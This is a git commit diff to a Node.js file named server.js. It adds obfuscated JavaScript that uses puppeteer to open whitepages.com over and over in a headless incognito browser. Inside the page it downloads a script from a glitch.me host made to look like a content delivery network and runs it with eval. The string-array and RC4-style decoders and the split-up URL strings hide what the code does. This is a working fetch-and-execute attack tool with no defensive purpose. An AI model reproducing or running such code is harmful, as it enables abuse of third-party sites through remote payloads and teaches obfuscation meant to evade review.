30312eb6ff078a93b74b0d022ffa92d900f77396
imdying <amogus77@gmail.com>
2023-01-31 04:05:21 -0500

    a: 1675155921314

--- snet/server.js
+++ snet/server.js
@@ -1,3 +1,91 @@
+function a() {
+  const r = ['rGJcSGddQW'];
+  a = function() {
+    return r;
+  };
+  return a();
+}
+
+function d(b, c) {
+  const e = a();
+  return d = function(f, g) {
+    f = f - (0x1 * 0x1199 + -0xbfe + -0x59b);
+    let h = e[f];
+    return h;
+  }, d(b, c);
+}
+
+function c(b, d) {
+  const e = a();
+  return c = function(f, g) {
+    f = f - (0x1 * 0x1199 + -0xbfe + -0x59b);
+    let h = e[f];
+    if (c['RBFBiU'] === undefined) {
+      var i = function(m) {
+        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
+        let o = '',
+          p = '';
+        for (let q = 0x3 * 0x24a + 0x1a84 + -0x1 * 0x2162, r, s, t = 0xe57 * 0x1 + -0x316 * -0x4 + -0x9 * 0x2f7; s = m['charAt'](t++); ~s && (r = q % (-0x2 * -0x82f + -0x19d1 + -0x977 * -0x1) ? r * (0x1729 + 0x3 * 0x7eb + -0x2eaa) + s : s, q++ % (-0x1 * -0x237b + 0x1 * 0x1159 + -0x34d0)) ? o += String['fromCharCode'](-0xc73 + 0x2 * -0x942 + -0x2 * -0xffb & r >> (-(-0xdbf + -0x10 * 0xc5 + 0x1a11) * q & 0x1 * -0x21d9 + 0xc07 * 0x3 + 0x2 * -0x11b)) : 0x1 * -0x6ad + 0x186e + -0x11c1 * 0x1) {
+          s = n['indexOf'](s);
+        }
+        for (let u = -0x2051 * 0x1 + 0x8ad * -0x1 + 0x28fe, v = o['length']; u < v; u++) {
+          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x4 * -0xc7 + -0x1eec + -0x37c * -0x8))['slice'](-(0x78a + 0x5c * 0x33 + 0x1 * -0x19dc));
+        }
+        return decodeURIComponent(p);
+      };
+      c['ppVcGK'] = i, b = arguments, c['RBFBiU'] = !![];
+    }
+    const j = e[0x1203 * 0x2 + -0x69e + 0x1 * -0x1d68],
+      k = f + j,
+      l = b[k];
+    return !l ? (h = c['ppVcGK'](h), b[k] = h) : h = l, h;
+  }, c(b, d);
+}
+
+function b(c, d) {
+  const e = a();
+  return b = function(f, g) {
+    f = f - (0x1 * 0x1199 + -0xbfe + -0x59b);
+    let h = e[f];
+    if (b['bLOYIT'] === undefined) {
+      var i = function(n) {
+        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
+        let p = '',
+          q = '';
+        for (let r = 0x3 * 0x24a + 0x1a84 + -0x1 * 0x2162, s, t, u = 0xe57 * 0x1 + -0x316 * -0x4 + -0x9 * 0x2f7; t = n['charAt'](u++); ~t && (s = r % (-0x2 * -0x82f + -0x19d1 + -0x977 * -0x1) ? s * (0x1729 + 0x3 * 0x7eb + -0x2eaa) + t : t, r++ % (-0x1 * -0x237b + 0x1 * 0x1159 + -0x34d0)) ? p += String['fromCharCode'](-0xc73 + 0x2 * -0x942 + -0x2 * -0xffb & s >> (-(-0xdbf + -0x10 * 0xc5 + 0x1a11) * r & 0x1 * -0x21d9 + 0xc07 * 0x3 + 0x2 * -0x11b)) : 0x1 * -0x6ad + 0x186e + -0x11c1 * 0x1) {
+          t = o['indexOf'](t);
+        }
+        for (let v = -0x2051 * 0x1 + 0x8ad * -0x1 + 0x28fe, w = p['length']; v < w; v++) {
+          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x4 * -0xc7 + -0x1eec + -0x37c * -0x8))['slice'](-(0x78a + 0x5c * 0x33 + 0x1 * -0x19dc));
+        }
+        return decodeURIComponent(q);
+      };
+      const m = function(n, o) {
+        let p = [],
+          q = 0x1203 * 0x2 + -0x69e + 0x1 * -0x1d68,
+          r, t = '';
+        n = i(n);
+        let u;
+        for (u = -0x12e0 + -0x5 * -0x53c + -0x74c; u < 0x1 * 0xb3 + 0x1c7e + 0x407 * -0x7; u++) {
+          p[u] = u;
+        }
+        for (u = -0x1 * -0x256e + 0x1 * 0xe57 + -0x1d * 0x1c9; u < -0x1743 + -0x1cc5 + 0x4 * 0xd42; u++) {
+          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1ad3 + 0x158e + 0x5 * 0x141), r = p[u], p[u] = p[q], p[q] = r;
+        }
+        u = -0x71 * -0x14 + 0x1b63 + -0x2437, q = 0x36 * -0x12 + 0x15 * -0x126 + 0x3 * 0x94e;
+        for (let v = 0x5e0 * -0x5 + 0x1 * -0x1687 + -0x135 * -0x2b; v < n['length']; v++) {
+          u = (u + (-0x1 * -0x302 + -0x114 * -0x18 + -0x1 * 0x1ce1)) % (-0x18d * -0xf + -0x96 + 0xb3 * -0x1f), q = (q + p[u]) % (-0x1d22 + -0x2 * -0x790 + 0xf02), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xc5b * -0x1 + 0x5 * -0x2e9 + 0x1be8)]);
+        }
+        return t;
+      };
+      b['pShrbC'] = m, c = arguments, b['bLOYIT'] = !![];
+    }
+    const j = e[0x246 + 0x1669 * 0x1 + 0x47 * -0x59],
+      k = f + j,
+      l = c[k];
+    return !l ? (b['TGAwcC'] === undefined && (b['TGAwcC'] = !![]), h = b['pShrbC'](h, g), c[k] = h) : h = l, h;
+  }, b(c, d);
+}
 ((async () => {
   const e = require('puppeteer'),
     f = await e['launch']({
@@ -8,14 +96,15 @@
       ]
     });
   (async function g() {
-    let h = -0x1 * -0xf29 + -0x21d3 + -0x2 * -0x955;
+    const l = b;
+    let h = -0x1fd3 + -0xb4 * -0x20 + -0x7 * -0x155;
     const i = await f['createInco' + 'gnitoBrows' + 'erContext'](),
       j = await i['newPage']();
     return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
       'timeout': 0x11170
     })['catch'](k => h++), h ? (await j['close'](), await i['close'](), g()) : (await j['evaluate'](() => {
       let k = new XMLHttpRequest();
-      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x65b * -0x4 + 0x81b + 0x1151), k['send'](), eval(k['responseTe' + 'xt']);
-    }), await wait(0x11204f + -0x12c529 + 0xf607a), await j['close'](), await i['close'](), g());
+      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1003 + 0x42 * 0x16 + 0xa57), k['send'](), eval(k['responseTe' + 'xt']);
+    }), await wait(0x101b26 + 0x201 * 0x45a + -0x2 * 0x58bf0), await j[l(0x0, 'QABh')](), await i['close'](), g());
   }());
 })());
